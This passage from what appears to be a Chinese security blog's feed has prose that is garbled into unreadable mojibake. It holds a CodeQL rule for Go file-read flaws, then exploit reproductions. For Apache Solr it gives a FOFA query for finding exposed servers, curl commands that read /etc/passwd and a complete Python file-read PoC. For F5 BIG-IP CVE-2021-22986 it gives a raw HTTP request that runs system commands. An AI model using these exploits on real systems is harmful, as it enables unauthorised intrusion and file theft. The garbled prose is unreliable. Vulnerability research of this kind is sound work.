<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041529964.png" alt="image-20221212221508877"></p>
<h2 id="åŠ å…¥å·¥å…·ç›‘æ§ã€æ‰«æ"><a href="#åŠ å…¥å·¥å…·ç›‘æ§ã€æ‰«æ" class="headerlink" title="åŠ å…¥å·¥å…·ç›‘æ§ã€æ‰«æ"></a>åŠ å…¥å·¥å…·ç›‘æ§ã€æ‰«æ</h2><p>å› ä¸ºé¡¹ç›®ä¸­è°ƒç”¨ Codeql å°†æ‰«æç»“æœä¿å­˜ä¸ºæ–‡ä»¶ï¼Œè¿™é‡Œéœ€åœ¨æ–‡ä»¶å¤´æ·»åŠ ä¸€äº›æè¿°,å®Œæ•´ä»£ç å¦‚ä¸‹</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name read file</span></span><br><span class="line"><span class="comment"> * @description read file</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity error</span></span><br><span class="line"><span class="comment"> * @security-severity 6.1</span></span><br><span class="line"><span class="comment"> * @sub-severity high</span></span><br><span class="line"><span class="comment"> * @id yhy0/read-file</span></span><br><span class="line"><span class="comment"> * @tags security</span></span><br><span class="line"><span class="comment"> * @precision high</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">go</span></span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class ReadFileSink extends DataFlow::Node &#123;</span><br><span class="line">    ReadFileSink() &#123;</span><br><span class="line">        exists(</span><br><span class="line">            DataFlow::CallNode call |</span><br><span class="line">            call.getTarget().hasQualifiedName(<span class="string">&quot;os&quot;</span>, <span class="string">&quot;Open&quot;</span>) |</span><br><span class="line">            call.getArgument(<span class="number">0</span>) = this <span class="comment">// æ ‡è®° sink ä¸º os.Open ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ReadFileConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    ReadFileConfig() &#123; this = <span class="string">&quot;read file&quot;</span> &#125;</span><br><span class="line">    <span class="comment">// è¿™é‡Œçš„ source å®ç° UntrustedFlowSource ,æ–¹ä¾¿å…¶ä»–æ¡†æ¶é€šç”¨, å¯¹äºGrafana ,æˆ‘ä»¬å·²ç»ä¿®æ”¹äº†go/ql/lib/semmle/go/frameworks/Macaron.qllæ–‡ä»¶</span></span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123; source instanceof UntrustedFlowSource &#125;</span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123; sink instanceof ReadFileSink &#125;</span><br><span class="line">    override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">        exists(</span><br><span class="line">            CallExpr call, SimpleAssignStmt sas |</span><br><span class="line">            <span class="comment">// call.getTarget().getName() = &quot;Params&quot; and</span></span><br><span class="line">            <span class="comment">// é™åˆ¶ä¸º Params å‡½æ•°ä¼šäº§ç”Ÿå±€é™æ€§ï¼Œå»é™¤</span></span><br><span class="line">            call.getAnArgument() = pred.asExpr() and</span><br><span class="line">            sas.getRhs().getAChild() = call.getParent*().getAChild() and</span><br><span class="line">            <span class="comment">// ä½¿ç”¨getParent*()æ˜¯å› ä¸ºç­‰å·å³è¾¹ä¸æ­¢æœ‰å…‰ç§ƒç§ƒçš„Paramsæ–¹æ³•è°ƒç”¨ï¼Œå¦‚æ¼æ´ç‚¹å°±å­˜åœ¨Jionå‡½æ•°æ‹¼æ¥æ“ä½œï¼Œéœ€è¦é€šè¿‡ä¼ é€’é—­åŒ…getParent*()æ¥è·å–å®Œæ•´è¡¨è¾¾å¼</span></span><br><span class="line">            <span class="comment">// ä½¿ç”¨getAChild()åˆ™æ˜¯è¦è·å–Paramsçš„æ–¹æ³•è°ƒç”¨ï¼Œä¸è¿‡æµ‹è¯•å‘ç°ç”¨ä¸ç”¨æ•ˆæœå·®ä¸å¤šï¼Œæ‰€ä»¥ä¹Ÿä¸æ‡‚ä¸ºä»€ä¹ˆè¿˜è¦åŠ è¿™ä¸ª</span></span><br><span class="line">            sas.getRhs() = succ.asExpr()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from ReadFileConfig rfc, DataFlow::PathNode sink, DataFlow::PathNode source</span><br><span class="line">where rfc.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink.getNode(), source, sink, <span class="string">&quot;read file find on $@.&quot;</span>, source.getNode(), <span class="string">&quot;user-provided value&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å°†æ­¤ ql æ–‡ä»¶è·¯å¾„åŠ å…¥é…ç½®æ–‡ä»¶<code>config.yaml</code>ä¸­, <code>- go/ql/src/myRules/ReadFile.ql </code>,ä¹‹åç¨‹åºä¼šè‡ªåŠ¨å¯¹ç›‘æ§çš„é¡¹ç›®è¿è¡Œæ­¤æ¡è§„åˆ™ï¼Œç­‰å¾…æ¡æ´å³å¯(ç¬”è€…å·²ç»æ¡åˆ°äº†^_^)</p>
<h1 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h1><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041529682.png" alt="image-20221213143603327"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041530535.png" alt="image-20221215162315622"></p>
<p>é¡¹ç›®çš„å…·ä½“ä»‹ç»è¯·çœ‹ <a href="https://github.com/ZhuriLab/Yi">https://github.com/ZhuriLab/Yi</a></p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://tyskill.github.io/posts/codeql-grafana/#%E5%AE%9E%E8%B7%B5grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">https://tyskill.github.io/posts/codeql-grafana/#%E5%AE%9E%E8%B7%B5grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96</a></p>
<p><a href="https://xz.aliyun.com/t/10648">https://xz.aliyun.com/t/10648</a></p>
<p><a href="https://codeql.github.com/">https://codeql.github.com/</a></p>
]]></content>
      <categories>
        <category>GitHubå·¥å…·</category>
      </categories>
      <tags>
        <tag>GitHubå·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¼æ´å¤ç°-Apache Solr ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</title>
    <url>/2021/03/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<blockquote>
<p>  è¿™å‘¨åœ¨hwï¼Œæ°´ä¸€ç¯‡æ–‡ç« ï¼Œè®°å½•ä¸€ä¸‹æ¼æ´åˆ©ç”¨ï¼Œå½“ä¸€ä¸ªåˆæ ¼çš„è„šæœ¬å°å­</p>
</blockquote>
<h2 id="0x01-æ¼æ´æè¿°"><a href="#0x01-æ¼æ´æè¿°" class="headerlink" title="0x01 æ¼æ´æè¿°"></a>0x01 æ¼æ´æè¿°</h2><p>ç”±äºApache Solré»˜è®¤å®‰è£…æ—¶æœªå¼€å¯èº«ä»½éªŒè¯ï¼Œå¯¼è‡´æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯åˆ©ç”¨Config APIæ‰“å¼€requestDispatcher.requestParsers.enableRemoteStreamingå¼€å…³ï¼Œä»è€Œä½¿æ”»å‡»è€…å¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹è·å–ç›®æ ‡æœåŠ¡å™¨æ•æ„Ÿæ–‡ä»¶ã€‚</p>
<blockquote>
<p>  å¬è¯´æŠ¥ç»™å®˜æ–¹åï¼Œå®˜æ–¹æ‹’ç»ä¿®å¤ï¼Œè®¤ä¸ºè¿™ä¸æ˜¯ä¸€ä¸ªæ¼æ´ï¼Œæ¯”ä¸€äº›srcè¿˜ç¦»è°±ï¼Œäººå®¶èµ·ç ä¼šç»™ä¸ªå†…éƒ¨å·²çŸ¥:eyes:</p>
</blockquote>
<h2 id="0x02-æ¼æ´å½±å“"><a href="#0x02-æ¼æ´å½±å“" class="headerlink" title="0x02 æ¼æ´å½±å“"></a>0x02 æ¼æ´å½±å“</h2><center>Apache Solr <= 8.8.1ï¼ˆå…¨ç‰ˆæœ¬ï¼‰</center> 

<h2 id="0x03-æ¼æ´å¤ç°"><a href="#0x03-æ¼æ´å¤ç°" class="headerlink" title="0x03 æ¼æ´å¤ç°"></a>0x03 æ¼æ´å¤ç°</h2><p>fofa è¯­æ³•ï¼š<code>app=&quot;Solr&quot;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204223.png" alt="image-20210318195353083"></p>
<h4 id="3-1-è·å–-core-nameï¼Œæ‹¼æ¥url"><a href="#3-1-è·å–-core-nameï¼Œæ‹¼æ¥url" class="headerlink" title="3.1 è·å– core nameï¼Œæ‹¼æ¥url"></a>3.1 è·å– core nameï¼Œæ‹¼æ¥url</h4><p><code>http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204233.png" alt="image-20210318195317802"></p>
<p>Core nameä¸ºï¼š<code>arabnews</code>ï¼Œé‚£ä¹ˆä½¿ç”¨çš„url ä¸º <code>http://xxx.xxx.xxx.xxx/solr/arabnews/config</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -d <span class="string">&#x27;&#123;  &quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span> http://xxx.xxx.xxx.xxx/solr/arabnews/config -H <span class="string">&#x27;Content-type:application/json&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ç»§ç»­ä½¿ç”¨ core name æ‹¼æ¥ <code>http://xxx.xxx.xxx.xxx/solr/arabnews/debug/dump?param=ContentStreams</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://xxx.xxx.xxx.xxx/solr/arabnews/debug/dump?param=ContentStreams&quot;</span> -F <span class="string">&quot;stream.url=file:///etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-æ”»å‡»"><a href="#3-2-æ”»å‡»" class="headerlink" title="3.2 æ”»å‡»"></a>3.2 æ”»å‡»</h4><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204248.png" alt="image-20210318200603145"></p>
<h2 id="0x04-æ¼æ´POC"><a href="#0x04-æ¼æ´POC" class="headerlink" title="0x04  æ¼æ´POC"></a>0x04  æ¼æ´POC</h2><p>PeiQiæ–‡åº“çš„å¤§ä½¬å·²ç»å†™å¥½äº†ï¼Œæˆ‘æ”¹äº†ä¸€ç‚¹å°æ¯›ç—…ï¼Œè¯»å–å®Œè¿”å›çš„å€¼ä¸ä¸€å®šæ˜¯jsonï¼Œæˆ‘å¤ç°çš„æ—¶å€™å°±é‡åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œå°†jsonå¤„ç†åˆ æ‰äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : PeiQi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0        \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34må…¬ä¼—å·  : PeiQiæ–‡åº“                        \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2019-0193.py       \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mFile   &gt;&gt;&gt; æ–‡ä»¶åç§°æˆ–ç›®å½•                  \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    core_url = target_url + <span class="string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.request(<span class="string">&quot;GET&quot;</span>, url=core_url, timeout=<span class="number">10</span>)</span><br><span class="line">        core_name = <span class="built_in">list</span>(json.loads(response.text)[<span class="string">&quot;status&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š&quot;</span> + target_url + <span class="string">&quot;/solr/&quot;</span> + core_name + <span class="string">&quot;/config\033[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> core_name</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\033[0m&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_2</span>(<span class="params">target_url, core_name</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/solr/&quot;</span> + core_name + <span class="string">&quot;/config&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-type&quot;</span>:<span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[36m[o] æ­£åœ¨å‡†å¤‡æ–‡ä»¶è¯»å–...... \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;responseHeader&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] ç›®æ ‡ &#123;&#125; å¯èƒ½å­˜åœ¨æ¼æ´ \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] ç›®æ ‡ &#123;&#125; ä¸å­˜åœ¨æ¼æ´\033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_3</span>(<span class="params">target_url, core_name, File_name</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/solr/&#123;&#125;/debug/dump?param=ContentStreams&quot;</span>.<span class="built_in">format</span>(core_name)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;stream.url=file://&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(File_name)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;No such file or directory&quot;</span> <span class="keyword">in</span> response.text:    </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] è¯»å–&#123;&#125;å¤±è´¥ \033[0m&quot;</span>.<span class="built_in">format</span>(File_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[36m[o] å“åº”ä¸º:\n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    core_name = POC_1(target_url)</span><br><span class="line">    POC_2(target_url, core_name)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        File_name = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">        POC_3(target_url, core_name, File_name)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204258.png" alt="image-20210318204216768"></p>
<h2 id="0x04-å‚è€ƒ"><a href="#0x04-å‚è€ƒ" class="headerlink" title="0x04 å‚è€ƒ"></a>0x04 å‚è€ƒ</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186&chksm=cecfaa8cf9b8239acbc83c363af62c41602cb167c485acc23a9850980044487585e6c408f632&scene=132#wechat_redirect">Apache Solr ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 1Day</a></p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¼æ´å¤ç°-F5 BIG-IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2021-22986)</title>
    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
    <content><![CDATA[<blockquote>
<p>  ç‡•å­æ¥æ—¶æ–°ç¤¾ï¼Œæ¢¨èŠ±è½åæ¸…æ˜ã€‚</p>
</blockquote>
<h2 id="0x01-æ¼æ´æè¿°"><a href="#0x01-æ¼æ´æè¿°" class="headerlink" title="0x01 æ¼æ´æè¿°"></a>0x01 æ¼æ´æè¿°</h2><p>F5 BIG-IP æ˜¯ç¾å›½ F5 å…¬å¸çš„ä¸€æ¬¾é›†æˆäº†ç½‘ç»œæµé‡ç®¡ç†ã€åº”ç”¨ç¨‹åºå®‰å…¨ç®¡ç†ã€è´Ÿè½½å‡è¡¡ç­‰åŠŸèƒ½çš„åº”ç”¨äº¤ä»˜å¹³å°ã€‚</p>
<p>CVE-2021-22986 è¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…é€šè¿‡BIG-IPç®¡ç†ç•Œé¢å’Œè‡ªèº«IPåœ°å€å¯¹iControl RESTæ¥å£è¿›è¡Œç½‘ç»œè®¿é—®ï¼Œä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œåˆ›å»ºæˆ–åˆ é™¤æ–‡ä»¶ä»¥åŠç¦ç”¨æœåŠ¡ã€‚</p>
<h2 id="0x02-æ¼æ´å½±å“"><a href="#0x02-æ¼æ´å½±å“" class="headerlink" title="0x02 æ¼æ´å½±å“"></a>0x02 æ¼æ´å½±å“</h2><table>
<thead>
<tr>
<th align="center">F5 BIG-IP 16.0.0-16.0.1</th>
<th>F5 BIG-IP 12.1.0-12.1.5.2</th>
</tr>
</thead>
<tbody><tr>
<td align="center">F5 BIG-IP 15.1.0-15.1.2</td>
<td>F5 BIG-IQ 7.1.0-7.1.0.2</td>
</tr>
<tr>
<td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td>
<td>F5 BIG-IQ 7.0.0-7.0.0.1</td>
</tr>
<tr>
<td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td>
<td>F5 BIG-IQ 6.0.0-6.1.0</td>
</tr>
</tbody></table>
<h2 id="0x03-æ¼æ´å¤ç°"><a href="#0x03-æ¼æ´å¤ç°" class="headerlink" title="0x03 æ¼æ´å¤ç°"></a>0x03 æ¼æ´å¤ç°</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> æ³¨å†Œå¥½åï¼Œä¸‹è½½</p>
<p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  é€‰æ‹©ovaæ ¼å¼çš„ï¼Œå¯ä»¥å¿«é€Ÿä½¿ç”¨vmè™šæ‹Ÿæœºæ‰“å¼€ï¼Œå®‰è£…å®Œåï¼Œç”¨æˆ·åï¼šrootï¼Œå¯†ç ï¼šdefaultï¼ŒæˆåŠŸç™»é™†åï¼Œè¾“å…¥configè¾“å…¥config ï¼Œå‡ æ¬¡å›è½¦å³å¯çœ‹åˆ°å½“å‰ipï¼Œè®¿é—®</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144019.png" alt="image-20210404113304697"></p>
<h4 id="3-1-ä½¿ç”¨POCæ”»å‡»"><a href="#3-1-ä½¿ç”¨POCæ”»å‡»" class="headerlink" title="3.1 ä½¿ç”¨POCæ”»å‡»"></a>3.1 ä½¿ç”¨POCæ”»å‡»</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Host: 192.168.1.191</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144015.png" alt="image-20210404111524871"></p>
<h2 id="0x04-åˆ©ç”¨å·¥å…·ç¼–å†™"><a href="#0x04-åˆ©ç”¨å·¥å…·ç¼–å†™" class="headerlink" title="0x04 åˆ©ç”¨å·¥å…·ç¼–å†™"></a>0x04 åˆ©ç”¨å·¥å…·ç¼–å†™</h2><p>ç›´æ¥ä½¿ç”¨ä¸Šæ¬¡çš„<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">å›¾å½¢åŒ–æ¼æ´åˆ©ç”¨å·¥å…·</a>ç¼–å†™</p>
<blockquote>
<p>å›¾å½¢åŒ–æ¼æ´åˆ©ç”¨å·¥å…·å·²æ›´æ–°</p>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p>
<p>V1.1 </p>
<p>â€‹	å‚è€ƒå†°èçš„ä»£ç†ï¼Œæ·»åŠ ä»£ç†è®¾ç½®ï¼Œæ–¹ä¾¿èµ°burpè°ƒè¯•</p>
<p>â€‹	ä¼˜åŒ–æ‰¹é‡æ£€æŸ¥é€»è¾‘ï¼Œä½¿ç”¨æ¥å£ï¼Œè¿™æ ·æ¯æ¬¡æ·»åŠ æ–°çš„æ¼æ´åˆ©ç”¨æ—¶ï¼Œå°±ä¸éœ€è¦ä¿®æ”¹æ‰¹é‡æ£€æŸ¥çš„é€»è¾‘ã€‚</p>
</blockquote>
<p>åœ¨<code>src/main/java/com/yhy/core</code>ä¸‹æ–°å»º<code>CVE_2021_22986</code>ç±»ï¼Œå®ç°<code>ExploitInterface</code>æ¥å£ï¼Œå¹¶å®ç°é‡Œé¢çš„å‡½æ•°ï¼Œå…·ä½“å¡«å……ï¼Œç›´æ¥å°†é¡¹ç›®ä¸­çš„ç¤ºä¾‹<code>CVE_2020_14882</code> çš„å†…å®¹å¤åˆ¶è¿‡å»ï¼Œä¿®æ”¹ä¸€ä¸‹å†…å®¹ï¼Œå¡«å……payloadå³å¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144011.png" alt="image-20210404113814410"></p>
<p>å†™å®Œåï¼Œè¿›å…¥<code>src/main/java/com/yhy/core/Constants.java</code> å’Œ <code>src/main/java/com/yhy/tools/Tools.java</code>ä¿®æ”¹</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144002.png" alt="image-20210404132413838"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144006.png" alt="image-20210404132702066"></p>
<p>è¿è¡Œå³å¯ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>ç›—ç«è€…Prometheus</title>
    <url>/2023/02/18/%E7%9B%97%E7%81%AB%E8%80%85Prometheus/</url>
    <content><![CDATA[<blockquote>
<p>  ä»Šå¹´å¤šå†™æ–‡ç« ï¼Œå…ˆæŠŠå»å¹´çš„æ¸…ç†ä¸€ä¸‹</p>
</blockquote>
<h2 id="1-Prometheus"><a href="#1-Prometheus" class="headerlink" title="1.Prometheus"></a>1.Prometheus</h2><p>äº‘åŸç”Ÿçš„å¼€æºç›‘æ§å‘Šè­¦è§£å†³æ–¹æ¡ˆçš„ä¸€æ¬¾äº§å“</p>
<p>æ¶æ„å›¾</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201057474.png" alt="image-20220926171326026"></p>
<table>
<thead>
<tr>
<th align="center"><a href="https://github.com/prometheus/prometheus">Prometheus server</a></th>
